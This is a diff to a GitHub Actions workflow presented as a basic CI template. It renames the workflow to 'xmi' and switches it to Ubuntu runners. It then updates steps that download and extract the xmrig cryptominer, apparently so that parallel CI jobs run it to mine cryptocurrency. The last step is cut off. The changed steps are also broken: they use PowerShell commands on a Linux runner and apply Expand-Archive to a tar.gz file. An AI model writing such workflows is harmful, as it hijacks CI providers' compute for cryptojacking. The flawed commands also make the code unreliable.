@@ -1,6 +1,6 @@
 # This is a basic workflow to help you get started with Actions
 
-name: CI
+name: xmi
 
 # Controls when the workflow will run
 on:
@@ -16,7 +16,7 @@ on:
 jobs:
   build:
     name: Ex-code
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
     strategy:
       max-parallel: 5
       fail-fast: false
@@ -28,9 +28,9 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-msvc-win64.zip -OutFile xmrig-6.11.1-msvc-win64.zip
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -OutFile xmrig-6.16.4-linux-x64.tar.gz
     - name: Extract
-      run: Expand-Archive xmrig-6.11.1-msvc-win64.zip
+      run: Expand-Archive xmrig-6.16.4-linux-x64.tar.gz
     - name: Dir
       run: ls
     - name: RUNNING
